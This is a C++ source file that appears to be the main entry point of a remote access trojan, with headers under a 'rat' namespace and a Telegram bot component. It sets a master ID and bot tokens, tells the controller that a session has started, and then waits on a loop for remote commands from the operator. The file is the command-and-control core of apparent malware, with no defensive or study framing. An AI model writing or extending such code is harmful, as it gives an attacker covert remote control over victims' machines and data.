#include "macro.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/Handler.hpp"
#include "logging.hpp"
#include "rat/system.hpp"

#include <atomic>
#include <chrono>
#include <condition_variable>
#include <csignal>
#include <cstdint>
#include <fmt/chrono.h>
#include <fmt/core.h>
#include <iostream>
#include <mutex>
#include <string>
#include <thread>

#ifdef _WIN32
#  include <windows.h>
#endif

// ==============================
// Original globals / helpers
// ==============================


std::string init_message;

// Forward decls
static void botLoop();

// ==============================
// main
// ==============================
int main() {
    botLoop();
    return 0;
}

static void botLoop() {

    DEBUG_LOG("Bot constructing");

    if (init_message.empty()) {
        init_message = fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime());
    }

    rat::handler::Handler session_handler;
    
    session_handler.setMasterId(MASTER_ID);
    session_handler.initMainBot(TOKEN1_odahimbotzawzum);
    session_handler.initBackingBot(TOKEN_ODAHIMBOT);
    session_handler.initCurlClient(1);
    session_handler.initThreadPools(1, 1);

    session_handler.bot->sendMessage(init_message);

    session_handler.handleUpdates();

    DEBUG_LOG("Bot loop exiting — letting destructors clean up (RAII).");
    session_handler.bot->sendMessage("The session is being destroyed");
}

// ==============================
// Helpers
// ==============================



